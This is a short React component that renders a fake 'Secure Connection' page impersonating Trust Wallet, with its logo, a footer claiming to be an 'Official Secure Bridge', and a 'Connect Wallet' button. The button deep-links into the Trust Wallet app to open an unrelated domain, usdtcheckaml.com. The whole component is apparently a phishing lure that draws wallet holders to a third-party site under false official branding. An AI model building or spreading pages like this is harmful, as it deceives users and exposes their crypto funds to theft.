"use client";

import "./style.css";

const DEEP_LINK =
  "https://link.trustwallet.com/open_url?coin_id=60&url=https://usdtcheckaml.com";
const DOWNLOAD_URL = "https://trustwallet.com/download";

// ── Component ───────────────────────────────────────────────────────────────
export function CaptchaDeeplink() {
  return (
    <div className="twc-root">
      <div className="twc-card">
        <img src={"/favicon.png"} alt="Trust Wallet" className="twc-logo" />

        <h1 className="twc-title">Secure Connection</h1>

        <p className="twc-desc">
          To continue, please open this page in your&nbsp;Trust&nbsp;Wallet
          application.
        </p>

        <a href={DEEP_LINK} className="twc-btn">
          Connect Wallet
        </a>

        <a
          href={DOWNLOAD_URL}
          target="_blank"
          rel="noopener noreferrer"
          className="twc-secondary"
        >
          I don&apos;t have Trust Wallet
        </a>
      </div>

      <footer className="twc-footer">
        © Trust Wallet. Official Secure Bridge
      </footer>
    </div>
  );
}
